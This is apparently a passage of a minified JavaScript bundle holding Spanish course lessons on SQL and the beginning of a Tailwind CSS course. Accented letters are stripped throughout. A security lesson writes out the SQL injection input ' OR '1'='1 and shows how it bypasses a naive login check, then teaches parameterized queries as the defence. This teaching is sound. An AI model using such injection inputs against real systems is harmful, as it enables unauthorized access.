`,completed:!1},{id:"sql-06-agrupacion-having",title:"Agrupacin y Agregacin (GROUP BY, COUNT, SUM)",level:"semi-senior",content:"# Leccin 06: Agrupacin y Agregacin (GROUP BY, COUNT, SUM)\n\nA veces no quieres ver los registros individuales, quieres ver resmenes. Cuntos usuarios hay? Cul es el promedio de edad?\n\n## 1. Funciones de Agregacin\n*   `COUNT(*)`: Cuenta filas.\n*   `SUM(columna)`: Suma valores.\n*   `AVG(columna)`: Calcula el promedio.\n*   `MAX(columna)`: Busca el valor mximo.\n*   `MIN(columna)`: Busca el valor mnimo.\n\n## 2. Agrupando con `GROUP BY`\nSi quieres saber cuntos usuarios hay **por ciudad**.\n```sql\nSELECT ciudad, COUNT(*) as cantidad\nFROM usuarios\nGROUP BY ciudad;\n```\nEsto te devuelve algo como:\n- Madrid: 50\n- Barcelona: 30\n\n## 3. Filtrando grupos con `HAVING`\nEl `WHERE` filtra filas **antes** de agrupar. El `HAVING` filtra grupos **despus** de agrupar.\nQueremos ver solo las ciudades con ms de 10 usuarios:\n```sql\nSELECT ciudad, COUNT(*) as cantidad\nFROM usuarios\nGROUP BY ciudad\nHAVING COUNT(*) > 10;\n```\n\n---\n\n### Misin Semi-Senior:\nEntender la diferencia sagrada entre `WHERE` y `HAVING`.\n*   `WHERE`: Filtra filas individuales (ej: `WHERE edad > 18`).\n*   `HAVING`: Filtra resultados agregados (ej: `HAVING AVG(edad) > 25`).\n",completed:!1},{id:"sql-07-subconsultas",title:"Subqueries (Subconsultas)",level:"semi-senior",content:`# Leccin 07: Subqueries (Subconsultas)

Una Subquery es una consulta dentro de otra consulta. A veces, necesitas informacin previa para hacer la pregunta final.

## 1. Subqueries en el \`WHERE\`
Queremos todos los productos que tengan un precio superior al **promedio** de todos los precios.
El promedio primero hay que calcularlo.
\`\`\`sql
SELECT nombre, precio
FROM productos
WHERE precio > (SELECT AVG(precio) FROM productos);
\`\`\`
La subquery \`(SELECT AVG(precio) FROM productos)\` devuelve un solo nmero (ej: 15.5), y eso es lo que usa la query principal para comparar.

## 2. Subqueries en el \`FROM\` (Tablas derivadas)
A veces, nuestra fuente de datos no es una tabla real, sino el resultado de otra consulta.
\`\`\`sql
SELECT departamento, MAX(salario)
FROM (SELECT * FROM empleados WHERE activo = true) as empleados_activos
GROUP BY departamento;
\`\`\`

## 3. Subqueries vs JOINs
Muchas veces puedes reescribir una Subquery como un JOIN.
*   **Regla general:** Los JOINs suelen ser ms rpidos en bases de datos modernas, pero las Subqueries a veces son ms fciles de leer.

---

### Misin Semi-Senior:
Aprender a usar \`EXISTS\` en lugar de \`IN\` cuando la subquery devuelve muchos resultados, para mejorar la performance.
`,completed:!1},{id:"sql-08-practica-semi-senior",title:"Prctica y Evaluacin: Maestro de Consultas",level:"semi-senior",content:`# Prctica y Evaluacin: Maestro de Consultas

El SQL es como el ajedrez: Pocas reglas, infinitas combinaciones. Demuestra tu nivel Semi-Senior respondiendo a estas preguntas de negocio.

---

## 1. Ejercicio Semi-Senior 1: Ventas por Empleado (JOIN + GROUP BY)
**Consigna:** Tienes \`empleados\` (id, nombre) y \`ventas\` (id, empleado_id, monto).
*   Muestra el nombre de cada empleado y la suma total de sus ventas (\`SUM(monto)\`).
*   Si un empleado no ha vendido nada, debe aparecer con 0 o NULL (Usa \`LEFT JOIN\`).

## 2. Ejercicio Semi-Senior 2: El Cliente VIP (HAVING)
**Consigna:** Tienes la tabla \`clientes\` (id, nombre) y \`compras\` (id, cliente_id, monto).
*   Encuentra los clientes que hayan gastado ms de $10,000 acumulados en total.
*   Ordenalos de mayor a menor gasto.

## 3. Ejercicio Semi-Senior 3: El Producto ms Barato (Subquery)
**Consigna:** Encuentra todos los datos del producto que tenga el precio mnimo de toda la tabla \`productos\`.
(Pista: \`WHERE precio = (SELECT MIN(precio) FROM productos)\`).

---

### Misin:
Un Analista SQL Semi-Senior puede responder preguntas de negocio complejas en una sola consulta, sin tener que descargar los datos a Excel y procesarlos ah.
`,completed:!1,isProject:!0},{id:"sql-09-modelado-datos",title:"Modelado de Datos y Relaciones",level:"semi-senior",content:`# Leccin 09: Modelado de Datos y Relaciones

Antes de escribir SQL, hay que dibujar. El **Modelo Entidad-Relacin (MER)** es el mapa de tu base de datos.

## 1. Entidades y Atributos
Una **Entidad** es un objeto del mundo real (Usuario, Producto, Pedido). Se convierte en una **Tabla**.
Los atributos son las caractersticas (Nombre, Precio). Se convierten en **Columnas**.

## 2. Tipos de Relaciones
*   **1 a 1 (One-to-One):** Un usuario tiene un nico perfil de configuracin. (Raro, suelen estar en la misma tabla).
*   **1 a N (One-to-Many):** Un usuario tiene **mochos** pedidos. Un pedido pertenece a **un** solo usuario. (Esta es la ms comn).
*   **N a N (Many-to-Many):** Un estudiante tiene muchas clases. Una clase tiene muchos estudiantes.
    *   **Ojo!** Para hacer esto se necesita una **Tabla Intermedia** (o Pivot Table) que guarda los pares \`(estudiante_id, clase_id)\`.

## 3. Claves (Keys)
*   **Primary Key (PK):** Identifica nica e irrepetiblemente a una fila. (Suele ser \`id\` autoincremental o UUID).
*   **Foreign Key (FK):** Apunta a la PK de otra tabla. Es la que crea la relacin fsica.

---

### Misin de Diseo:
Si tienes una relacin N a N y no creas una tabla intermedia, ests cometiendo un error grave de diseo que har imposible consultar tus datos eficientemente.
`,completed:!1},{id:"sql-10-normalizacion",title:"Normalizacin (1NF, 2NF, 3NF)",level:"semi-senior",content:`# Leccin 10: Normalizacin (1NF, 2NF, 3NF)

Normalizar es organizar tus datos para evitar duplicados y anomalas. Es la diferencia entre un Excel gigante y una Base de Datos profesional.

## 1. Primera Forma Normal (1NF): Atomicidad
*   **Regla:** Una columna no puede tener ms de un valor.
*   **MAL:** Columna \`telefonos\` = "555-1234, 555-6789".
*   **BIEN:** Crear tabla \`telefonos_usuarios\` con una fila por cada telfono.

## 2. Segunda Forma Normal (2NF): Dependencia Parcial
*   **Regla:** Todo atributo debe depender de la **Clave Primaria completa**.
*   Si tienes una tabla \`ordenes (id_orden, id_producto, nombre_producto, cantidad)\`.
    *   \`nombre_producto\` depende solo de \`id_producto\`, no de la orden.
    *   **BIEN:** Mueve \`nombre_producto\` a una tabla separada \`productos\`.

## 3. Tercera Forma Normal (3NF): Dependencia Transitiva
*   **Regla:** Ningn atributo no-clave debe depender de otro atributo no-clave.
*   Si tienes \`usuarios (id, ciudad, codigo_postal)\`.
    *   \`ciudad\` depende de \`codigo_postal\`, no directamente del usuario.
    *   **BIEN:** Tabla \`ciudades (codigo_postal, ciudad)\` y referenciar por CP. (A veces se ignora por performance, esto se llama **Desnormalizacin**).

---

### Misin Normalizadora:
El objetivo de normalizar es **evitar la redundancia**. Si cambias el nombre de un producto, solo deberas cambiarlo en un lugar (la tabla \`productos\`), no en cada una de las 5000 rdenes que lo compraron.
`,completed:!1},{id:"sql-11-indices-vistas",title:"ndices, Vistas y Sp (Stored Procedures)",level:"senior",content:`# Leccin 11: ndices, Vistas y Sp (Stored Procedures)

Herramientas para que la base de datos trabaje por ti, y no al revs.

## 1. ndices (Indexes)
Un ndice es como el ndice al final de un libro.
*   **Sin ndice:** Para buscar a "Octavio", la DB tiene que leer TODAS las 10 millones de filas (Full Table Scan).
*   **Con ndice:** La DB va directo a la pgina donde est "Octavio".
\`\`\`sql
CREATE INDEX idx_usuarios_nombre ON usuarios(nombre);
\`\`\`
**Costo:** Los ndices ocupan espacio y hacen que los \`INSERT\` sean ms lentos (porque hay que actualizar el ndice).

## 2. Vistas (Views)
Son consultas guardadas que actan como tablas virtuales.
\`\`\`sql
CREATE VIEW usuarios_activos AS
SELECT nombre, email FROM usuarios WHERE activo = true;
\`\`\`
Ahora puedes hacer: \`SELECT * FROM usuarios_activos;\`. Es til para simplificar queries complejas o por seguridad (ocultar columnas sensibles).

## 3. Stored Procedures (Procedimientos Almacenados)
Es cdigo (lgica) que vive dentro de la base de datos.
\`\`\`sql
CREATE PROCEDURE DarDeBaja(IN usuario_id INT)
BEGIN
    UPDATE usuarios SET activo = false WHERE id = usuario_id;
    INSERT INTO log_bajas (usuario_id, fecha) VALUES (usuario_id, NOW());
END;
\`\`\`
Ventaja: Reduces el trfico de red, solo envas \`CALL DarDeBaja(5)\`.

---

### Misin Semi-Senior:
No indexes todo. Un exceso de ndices puede matar el rendimiento de escritura. Solo indiza las columnas que usas en el \`WHERE\`, \`JOIN\` y \`ORDER BY\`.
`,completed:!1},{id:"sql-12-transacciones-acid",title:"Transacciones y ACID",level:"senior",content:`# Leccin 12: Transacciones y ACID

Las Bases Relacionales garantizan la integridad. La clave son las Transacciones.

## 1. El concepto de la Transaccin
**Ejemplo:** Octavio le transfiere $1000 a Laura.
1.  Restar $1000 a Octavio.
2.  Sumar $1000 a Laura.

Si el servidor se apaga justo entre el paso 1 y el 2, el dinero desaparece. Pnico!
Para evitar esto, usamos \`BEGIN\`, \`COMMIT\` y \`ROLLBACK\`.
\`\`\`sql
BEGIN;
UPDATE cuentas SET saldo = saldo - 1000 WHERE id = 1;
-- Ups! Se corta la luz.
-- La base de datos hace ROLLBACK automtico al reiniciarse.
COMMIT;
\`\`\`

## 2. ACID
*   **Atomicidad:** "Todo o nada". O ocurren todos los pasos, o ninguno.
*   **Consistencia:** La DB pasa de un estado vlido a otro estado vlido (respetando restricciones).
*   **Aislamiento (Isolation):** Si dos transacciones ocurren a la vez, no se ven entre s hasta que terminan.
*   **Durabilidad:** Si haces COMMIT, el dato se escribe en disco y sobrevive a un reinicio.

## 3. Niveles de Aislamiento (Isolation Levels)
*   **Read Committed:** Solo lees datos confirmados (el default).
*   **Serializable:** Como si las transacciones ocurrieran una tras otra (lento pero seguro).

---

### Misin Semi-Senior:
Nunca dejes transacciones abiertas (\`BEGIN\` sin \`COMMIT\`). Bloquean filas y pueden congelar toda la aplicacin.
`,completed:!1},{id:"sql-13-optimizacion-explain",title:"Optimizacin Avanzada y JOIN Algorithms (Senior)",level:"senior",content:`# Leccin 13: Optimizacin Avanzada y JOIN Algorithms (Senior)

En el nivel Senior, no escribes consultas que funcionen, escribes consultas que vuelen.

## 1. EXPLAIN ANALYZE
Es el comando mgico que te dice QU hace el motor.
\`\`\`sql
EXPLAIN ANALYZE SELECT * FROM usuarios WHERE ciudad = 'Madrid';
\`\`\`
Te dir si hizo:
*   \`Index Scan:\` Us el ndice (Rpido!).
*   \`Seq Scan\` (Sequential): Ley toda la tabla (Lento!).

## 2. Algoritmos de JOIN
El motor elige automticamente, pero t debes entenderlos.
*   **Nested Loop Join:** Itera tabla A y dentro tabla B. Bueno para tablas pequeas. O(N*M).
*   **Hash Join:** Construye una tabla Hash. Rapidsimo para tablas grandes sin ndices. O(N+M).
*   **Merge Join:** Requiere que las tablas estn ordenadas. O(N log N + M log M).

## 3. Optimizando el \`WHERE\`
*   **Sargable Queries:** Search ARGument ABLE. Una query que puede usar ndices.
    *   **MAL:** \`WHERE YEAR(fecha) = 2023\`. (Calcula la funcin para cada fila, no usa ndice).
    *   **BIEN:** \`WHERE fecha >= '2023-01-01' AND fecha < '2024-01-01'\`. (Usa ndice de rango).
*   **Evitar \`LIKE '%texto%'\`:** El \`%\` al inicio inhabilita el ndice B-Tree habitual.

---

### Misin Senior:
Si una query tarda 10 segundos, no aadas ms RAM al servidor. Haz \`EXPLAIN ANALYZE\` y descubre qu ndice falta o qu funcin est matando el rendimiento.
`,completed:!1},{id:"sql-14-locks-concurrencia",title:"Bloqueos (Locks) y Concurrencia (Senior)",level:"senior",content:`# Leccin 14: Bloqueos (Locks) y Concurrencia (Senior)

Qu pasa si 100 usuarios intentan reservar el ltimo asiento del avin a la vez?

## 1. El Problema de la Carrera (Race Condition)
Dos consultas leen \`asientos = 1\`. Ambas restan 1. Ambas hacen \`UPDATE\`. Saldo final: -1. Overbooking!

## 2. Bloqueos Explcitos (SELECT FOR UPDATE)
Para evitar esto, le dices a la DB: "Voy a leer esta fila, pero bloquala para que nadie ms la toque hasta que termine mi transaccin".
\`\`\`sql
BEGIN;
SELECT * FROM vuelos WHERE id = 123 FOR UPDATE;
-- Aqu nadie ms puede leer ni escribir esta fila.
UPDATE vuelos SET asientos = asientos - 1 WHERE id = 123;
COMMIT;
-- Se libera el bloqueo.
\`\`\`

## 3. Deadlocks (El abrazo mortal)
Transaccin A bloquea Fila 1 y quiere Fila 2.
Transaccin B bloquea Fila 2 y quiere Fila 1.
Ambas esperan infinitamente.
*   **Solucin:** Siempre accede a las tablas en el mismo orden (primero tabla 1, luego tabla 2). O usa \`timeout\` en las transacciones.

## 4. MVCC (Multi-Version Concurrency Control)
Es cmo Postgres y Oracle manejan lecturas sin bloquear escrituras.
*   Cuando haces \`UPDATE\`, la DB no sobrescribe la fila vieja. Crea una copia nueva.
*   Las transacciones viejas siguen viendo la versin vieja hasta que terminan (Snapshot Isolation).

---

### Misin Senior:
Los bloqueos matan el rendimiento si no se liberan rpido. Mantn tus transacciones cortas y concisas.
`,completed:!1},{id:"sql-15-practica-senior",title:"Prctica y Evaluacin: Arquitecto Senior de Bases de Datos",level:"semi-senior",content:`# Prctica y Evaluacin: Arquitecto Senior de Bases de Datos

Demuestra tu nivel arquitectnico y de optimizacin.

---

## 1. El ndice Sargable (Performance)
**Pregunta:** Tienes una consulta \`SELECT * FROM ordenes WHERE YEAR(fecha) = 2023\`.
*   Explica por qu Postgres no puede usar el ndice \`idx_fecha\`.
*   Reescribe la consulta para que **S pueda usarlo**.

## 2. El Concurso de "Me Gusta" (Locks, ACID)
**Escenario:**
*   Tienes una tabla \`posts (id, likes)\`.
*   Llegan 1000 usuarios simultneamente para dar "Like".
*   Si haces \`UPDATE posts SET likes = likes + 1 WHERE id = 123\` sin transaccin, qu pasa?
*   Cmo lo arreglaras usando \`SELECT FOR UPDATE\` o \`Isolation Levels\`?

## 3. Optimizando JOINs
**Escenario:** Tienes una tabla \`usuarios\` (1 milln de registros) y una tabla \`ventas\` (10 millones de registros).
*   El \`Deep Query Optimizer\` decide usar \`NESTED LOOP\` en lugar de \`HASH JOIN\`. Por qu puede pasar esto? (Pista: Estadsticas desactualizadas).
*   Cmo forzaras al motor a actualizar estadsticas (\`ANALYZE\`)?

---

### Recordatorio Final:
En SQL, una coma mal puesta rompe la sintaxis. Un JOIN mal hecho rompe el servidor. Escribe con cuidado. 
`,completed:!1,isProject:!0},{id:"sql-16-sql-backend",title:"SQL en el Backend (Node.js y Python)",level:"senior",content:`# Leccin 16: SQL en el Backend (Node.js y Python)

SQL no vive en el vaco. Lo usamos desde nuestras aplicaciones. Aqu es donde la teora choca con la prctica.

## 1. Drivers Nativos (Raw SQL)
Es la forma ms rpida y directa. Escribes SQL puro dentro de strings en tu cdigo.

### Node.js (con \`pg\`)
\`\`\`javascript
const { Pool } = require('pg');
const pool = new Pool();

// Parameterized Query (Seguro!)
const res = await pool.query('SELECT * FROM users WHERE id = $1', [userId]);
console.log(res.rows[0]);
\`\`\`

### Python (con \`psycopg2\` o \`sqlite3\`)
\`\`\`python
import sqlite3
con = sqlite3.connect("tutorial.db")
cur = con.cursor()

# Placeholder ? o %s segun la libreria
cur.execute("SELECT * FROM users WHERE email = ?", (email,))
print(cur.fetchone())
\`\`\`

## 2. ORMs (Object-Relational Mappers)
Herramientas que escriben el SQL por ti. (Prisma, TypeORM, SQLAlchemy, Django ORM).
*   **Ventajas:** Productividad extrema, Tipado fuerte (TypeScript), Migraciones automticas.
*   **Desventajas:** "Cajanegra" (no sabes qu query ejecuta), Performance (a veces generan queries ineficientes), Curva de aprendizaje.

## 3. Query Builders (El punto medio)
Libreras como \`Knex.js\` o \`Kysely\`. Te dejan construir queries con cdigo pero te dan control total.
\`\`\`javascript
db.selectFrom('person')
  .select(['first_name', 'last_name'])
  .where('id', '=', 1)
  .execute()
\`\`\`

---

### Misin Backend:
Un Senior sabe usar un ORM para el 90% de las tareas CRUD simples, y bajar a SQL Puro (Raw) para ese 10% de reportes complejos que el ORM no sabe optimizar.
`,completed:!1},{id:"sql-17-seguridad-sql",title:"Seguridad en Bases de Datos (SQL Injection & Permisos)",level:"senior",content:`# Leccin 17: Seguridad en Bases de Datos (SQL Injection & Permisos)

La base de datos es el tesoro. Protegerla no es opcional.

## 1. El ataque de "SQL Injection"
Imagina un login inseguro:
\`\`\`sql
SELECT * FROM users WHERE username = '$user' AND password = '$pw';
\`\`\`
Si el atacante pone de usuario \`' OR '1'='1\`, la query se convierte en:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
\`\`\`
Esto es siempre \`TRUE\` y entra sin saber la contrasea!

## 2. La solucin: Prepared Statements (Consultas Parametrizadas)
Separa el cdigo (SQL) de los datos (Input).
*   **MAL:** \`query("SELECT * FROM users WHERE id = " + input)\`
*   **BIEN:** \`query("SELECT * FROM users WHERE id = $1", [input])\`
El motor de base de datos trata el input como LITERAL, no como cdigo ejecutable.

## 3. Principio de Menor Privilegio (Roles y Permisos)
No conectes tu app a la DB usando el usuario \`root\` o \`postgres\` (Superadmin).
Crea un usuario especfico para la aplicacin (\`app_user\`).
\`\`\`sql
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password123';
GRANT SELECT, INSERT, UPDATE, DELETE ON mi_base.* TO 'app_user'@'localhost';
-- NO le des permisos de DROP TABLE o ALTER TABLE!
\`\`\`
As, si alguien hackea tu servidor web, no puede borrar tus tablas.

---

### Misin Seguridad:
Nunca confes en el usuario final. Ni en frontend validation (se puede bypassear con Postman). **Siempre sanitiza y usa parmetros en el backend.**
`,completed:!1},{id:"sql-18-testing-sql",title:"Testing de Consultas SQL",level:"senior",content:`# Leccin 18: Testing de Consultas SQL

Cmo sabes si tu consulta SQL sigue funcionando despus de cambiar la estructura de la tabla? Solo con tests.

## 1. Bases de Datos Efmeras (Ephemeral DBs)
Para testear SQL, idealmente quieres una base de datos real, no un Mock.
*   **Docker:** Antes de correr los tests, levantas un contenedor de Postgres nuevo.
*   **SQLite In-Memory:** Para tests rpidos, usas \`:memory:\`. Pero cuidado, SQLite no tiene todas las funciones de Postgres.

## 2. Fixtures de Datos (Seeding)
Necesitas datos predecibles.
\`\`\`sql
-- setup.sql
INSERT INTO users (id, name, email) VALUES (1, 'Test User', 'test@mail.com');
\`\`\`
Tu test ejecuta esto al inicio y borra todo al final.

## 3. Probando la Performance
En la CI (Integracin Continua), puedes fallar el test si la query tarda ms de 100ms.
\`\`\`python
start = time.time()
db.execute("SELECT * FROM heavy_table")
assert time.time() - start < 0.1
\`\`\`

---

### Misin Testing:
No uses la base de datos de produccin para testear. Nunca. Jams. Ni siquiera "un poquito".
`,completed:!1},{id:"sql-19-errores-comunes",title:"Errores Comunes de un Desarrollador SQL",level:"senior",content:`# Leccin 19: Errores Comunes de un Desarrollador SQL

Prevenir es mejor que curar (especialmente cuando curar implica restaurar un backup de 500GB).

## 1. El Problema "N+1 Queries" (Backend + SQL)
Tienes una lista de 100 usuarios y quieres sus direcciones.
*   **Junior:** Hace 1 query para obtener usuarios, y luego un bucle \`for\` que hace 1 query extra por cada usuario. Total: 101 consultas.
*   **Solucin:** Usar \`JOIN\` o \`WHERE id IN (...)\`. Total: 1 o 2 consultas.

## 2. Guardar listas separadas por comas (1NF Violation)
*   **Error:** Columna \`tags\` con valor "sql,python,react".
*   **Problema:** Cmo buscas "todos los usuarios que saben python"? \`LIKE '%python%'\` es lento e inexacto.
*   **Solucin:** Tabla intermedia \`usuarios_tags\`.

## 3. SELECT * (Asterisco) en Produccin
*   Trae columnas que no necesitas (desperdicia red y memoria).
*   Si agregas una columna pesada (BLOB) a la tabla, tu app se vuelve lenta sin aviso.

---

### Misin de Calidad:
Nunca uses \`ORDER BY RAND()\` en tablas grandes. Para sacar un registro aleatorio, el motor tiene que ordenar *toda la tabla* (1 milln de filas) y luego tomar uno. Es la muerte del CPU.
`,completed:!1},{id:"sql-20-roadmap-sql",title:"Roadmap SQL - De Aprendiz a DBA",level:"senior",content:`# Leccin 20: Roadmap SQL - De Aprendiz a DBA

El SQL es una de las habilidades ms longevas y tiles que puedes aprender.

## Fase 1: El Consultor (Junior)
*   **Foco:** Extraer datos.
*   **Aprender:** SELECT, WHERE, JOIN bsico, GROUP BY.
*   **Tools:** DBeaver, pgAdmin.
*   **Caso Real:** "Scame un reporte de ventas del mes pasado en Excel".

## Fase 2: El Arquitecto (Semi-Senior)
*   **Foco:** Disear y construir.
*   **Aprender:** Create Table, Constraints (FK, PK, UNIQUE), Normalizacin, ndices bsicos.
*   **Tools:** Diagramas ER, Docker.
*   **Caso Real:** Disear la base de datos para un E-commerce desde cero.

## Fase 3: El Optimizador (Senior)
*   **Foco:** Performance y Escala.
*   **Aprender:** EXPLAIN ANALYZE, Locks, Partitioning, Replication, Sharding.
*   **Tools:** Pgbadger, Datadog.
*   **Caso Real:** "La bsqueda tarda 5 segundos. Bjala a 50ms sin cambiar el hardware".

---

### Misin Final:
SQL no muere. Las bases NoSQL (Mongo, Redis) son geniales para casos especficos, pero el 90% del mundo corre sobre SQL. Aprndelo bien y tendrs trabajo por 20 aos.
`,completed:!1}]},fv={id:"tailwind",title:"Tailwind CSS",description:"Domina el framework de utilidades CSS ms popular y acelera tu flujo de trabajo de diseo.",completed:!1,lessons:[{id:"tailwind-junior-que-es-tailwind",title:"Qu es Tailwind CSS y por qu usarlo?",level:"junior",content:`# Leccin 1: Qu es Tailwind CSS y por qu usarlo?

Tailwind CSS es un **framework de CSS basado en utilidades (utility-first)**. A diferencia de Bootstrap o Material UI, no te da componentes pre-diseados (como un botn azul), sino pequeas piezas de construccin (clases) para que t crees lo que quieras.

## 1. La Mentalidad "Utility-First"

En CSS tradicional, creas una clase y le pones estilos:
\`\`\`css
/* CSS Tradicional */
.btn-blue {
  background-color: #3b82f6;
  color: white;
  padding: 0.5rem 1rem;
  border-radius: 0.25rem;
}
\`\`\`

En Tailwind, aplicas clases directamente en el HTML:
\`\`\`html
<!-- Tailwind CSS -->
<button class="bg-blue-500 text-white font-bold py-2 px-4 rounded">
  Botn
</button>
\`\`\`

## 2. Por qu usarlo?

1.  **Velocidad de desarrollo:** No tienes que saltar entre tu HTML y tu archivo CSS.
2.  **Mantenibilidad:** El archivo CSS no crece infinitamente. Tailwind solo genera el CSS que realmente usas.
3.  **Consistencia:** Usas un sistema predefinido de colores y espaciado (nada de \`padding: 13px;\` vs \`padding: 15px;\`).
4.  **No hay conflictos de nombres:** Ya no tienes que pensar si llamar a algo \`.wrapper-container\` o \`.container-main\`.

## 3. Comparacin Directa

**CSS Tradicional:** Tienes que inventar nombres de clases y preocuparte por la cascada.
**Tailwind:** Aplicas estilos atmicos. Si quieres cambiar el margen, cambias la clase en el elemento y listo.

---

## Mini Ejercicio
Si en CSS tradicional usas \`display: flex;\`, en Tailwind la clase es simplemente \`flex\`. 
Cmo crees que sera la clase para cambiar el texto a color rojo? (Pista: usa el formato \`text-{color}-{intensidad}\`).
`,completed:!1},{id:"tailwind-junior-instalacion",title:"Instalacin y Configuracin",level:"junior",content:`# Leccin 2: Instalacin y Configuracin

Existen varias formas de usar Tailwind, pero la recomendada para proyectos modernos es mediante **PostCSS** o su **CLI**.

## 1. Instalacin va npm

\`\`\`bash
npm install -D tailwindcss postcss autoprefixer
npx tailwindcss init
\`\`\`

Esto crear un archivo llamado \`tailwind.config.js\`.

## 2. Configuracin de Rutas (Content)

En \`tailwind.config.js\`, debes decirle a Tailwind dnde estn tus archivos para que pueda "purgar" el CSS que no usas.

\`\`\`javascript
/** @type {import('tailwindcss').Config} */
module.exports = {
  content: ["./src/**/*.{html,js,ts,jsx,tsx}"],
  theme: {
    extend: {},
  },
  plugins: [],
}
\`\`\`

## 3. Las Directivas de Tailwind

Debes agregar Tailwind a tu archivo CSS principal (ej: \`index.css\`):

\`\`\`css
@tailwind base;
@tailwind components;
@tailwind utilities;
\`\`\`

*   **Base:** Resetea los estilos del navegador (Preflight).
*   **Components:** Para tus propias clases reutilizables.
*   **Utilities:** El ncleo de Tailwind.

## 4. El CDN (Solo para pruebas)

Si solo quieres probar algo rpido sin instalar nada, puedes usar el CDN:
\`\`\`html
<script src="https://cdn.tailwindcss.com"><\/script>
\`\`\`
* No recomendado para produccin porque descarga todo el framework.*

---

## Mini Ejercicio
Si quieres cambiar la tipografa base de tu proyecto, en qu seccin del archivo \`tailwind.config.js\` crees que deberas agregar tu nueva fuente?
`,completed:!1},{id:"tailwind-junior-layout",title:"Clases de Layout",level:"junior",content:"# Leccin 3: Clases de Layout\n\nEl Layout es la estructura de tu pgina. Tailwind ofrece clases para manejar el ancho, la visibilidad, la posicin y ms.\n\n## 1. Contenedores y Ancho\n\n*   **`container`:** Crea un contenedor con un ancho mximo fijo basado en los breakpoints.\n*   **`w-{size}`:** Controla el `width`.\n    *   `w-full`: 100%.\n    *   `w-screen`: 100vw.\n    *   `w-1/2`: 50%.\n    *   `w-48`: 12rem (48 * 0.25rem).\n\n## 2. Altura (Height)\n\n*   **`h-{size}`:** Similar al ancho.\n    *   `h-screen`: 100vh.\n    *   `h-full`: 100%.\n\n## 3. Visualizacin (Display)\n\n*   `block`, `inline-block`, `inline`, `flex`, `grid`, `hidden` (display: none).\n\n## 4. Posicin\n\n*   `static`, `relative`, `absolute`, `fixed`, `sticky`.\n*   Para mover elementos posicionados: `top-0`, `left-10`, `inset-0` (todas las direcciones).\n\n## 5. El sistema de medida (0.25rem)\n\nEn Tailwind, casi todos los nmeros se multiplican por **4px (0.25rem)**.\n*   `w-4` = 16px.\n*   `w-1` = 4px.\n*   `w-10` = 40px.\n\n---\n\n## Mini Ejercicio\nSi quieres que un elemento ocupe exactamente la mitad del ancho de la pantalla y la mitad de la altura, qu clases usaras?\n",completed:!1},{id:"tailwind-junior-tipografia",title:"Tipografa",level:"junior",content:"# Leccin 4: Tipografa\n\nTailwind hace que manejar textos sea extremadamente sencillo y consistente.\n\n## 1. Tamao de Fuente (`text-{size}`)\n\n*   `text-xs`: 0.75rem\n*   `text-base`: 1rem (base)\n*   `text-xl`: 1.25rem\n*   `text-4xl`: 2.25rem\n*   `text-9xl`: 8rem\n\n## 2. Grosor de Fuente (`font-{weight}`)\n\n*   `font-light`: 300\n*   `font-normal`: 400\n*   `font-bold`: 700\n*   `font-black`: 900\n\n## 3. Alineacin y Decoracin\n\n*   Alineacin: `text-left`, `text-center`, `text-right`.\n*   Decoracin: `underline`, `italic`, `uppercase`, `lowercase`, `capitalize`.\n\n## 4. Familias de Fuente\n\nTailwind trae tres familias por defecto:\n*   `font-sans`: Letras redondas (Inter, system-sans).\n*   `font-serif`: Letras con remates (Georgia, Times New Roman).\n*   `font-mono`: Fuentes de cdigo.\n\n## 5. Espaciado de letras y lneas\n\n*   `leading-{size}`: Line-height (ej: `leading-tight`).\n*   `tracking-{size}`: Letter-spacing (ej: `tracking-widest`).\n\n---\n\n## Mini Ejercicio\nCrea una combinacin de clases para un ttulo que sea: Extra grande (5xl), Negrita (bold), todo en Maysculas (uppercase) y centrado.\n",completed:!1},{id:"tailwind-junior-colores",title:"Colores",level:"junior",content:'# Leccin 5: Colores\n\nUno de los puntos fuertes de Tailwind es su paleta de colores cuidadosamente curada.\n\n## 1. La Nomenclatura\n\nLos colores se componen de: `tipo-color-intensidad`\n*   `tipo`: `text`, `bg` (background), `border`, `outline`.\n*   `color`: `blue`, `red`, `slate`, `emerald`, `amber`, etc.\n*   `intensidad`: Un nmero del **50** al **950**.\n    *   `50`: Casi blanco.\n    *   `500`: Color puro.\n    *   `950`: Casi negro.\n\n## 2. Los Colores de la Marca (Predefinidos)\n\n*   `slate`, `gray`, `zinc`, `neutral`, `stone`: Diferentes tonos de grises.\n*   `red`, `orange`, `amber`, `yellow`: Clidos.\n*   `lime`, `green`, `emerald`, `teal`, `cyan`: Verdes y azules claros.\n*   `sky`, `blue`, `indigo`, `violet`, `purple`, `fuchsia`, `pink`, `rose`: Fros y vibrantes.\n\n## 3. Fondos y Opacidad\n\nPuedes aplicar opacidad al vuelo usando la barra literal `/`:\n```html\n<div class="bg-blue-500/50"> Fondo azul al 50% de opacidad </div>\n```\n\n## 4. Colores Especiales\n\n*   `white`: Blanco puro.\n*   `black`: Negro puro.\n*   `transparent`: Transparente.\n*   `current`: Toma el color del texto actual (til para iconos).\n\n---\n\n## Mini Ejercicio\nSi quieres crear un borde fino para una tarjeta, cul de estos colores crees que se vera ms profesional y sutil?\n1. `border-gray-500`\n2. `border-slate-200`\n3. `border-black`\n',completed:!1},{id:"tailwind-junior-espaciado",title:"Espaciado (Padding y Margin)",level:"junior",content:"# Leccin 6: Espaciado (Padding y Margin)\n\nEl espaciado es clave para que un diseo se sienta limpio. Tailwind usa la misma escala para padding, margin y gap.\n\n## 1. Padding (`p-{size}`)\n\nEs el espacio **interno** de un elemento.\n*   `p-4`: Padding en todos los lados (1rem).\n*   `px-4`: Padding izquierda y derecha (eje X).\n*   `py-4`: Padding arriba y abajo (eje Y).\n*   `pt-4`, `pr-4`, `pb-4`, `pl-4`: Lados especficos (top, right, bottom, left).\n\n## 2. Margin (`m-{size}`)\n\nEs el espacio **externo** de un elemento.\n*   Sigue la misma nomenclatura que el padding: `m-`, `mx-`, `my-`, `mt-`, `mr-`, `mb-`, `ml-`.\n*   **Margen Automtico:** `mx-auto` es la forma estndar de centrar un bloque con ancho fijo horizontalmente.\n\n## 3. Espacio entre elementos (`space-{dir}-{size}`)\n\nSi tienes una lista de elementos y quieres separarlos sin ponerle margen a cada uno:\n*   `space-x-4`: Separa elementos horizontalmente.\n*   `space-y-2`: Separa elementos verticalmente.\n\n## 4. Margen Negativo\n\nPuedes usar mrgenes negativos agregando un guion antes de la clase:\n*   `-mt-4`: Sube el elemento restando margen superior.\n\n---\n\n## Mini Ejercicio\nSi quieres que una tarjeta tenga mucho espacio interno a los lados pero poco 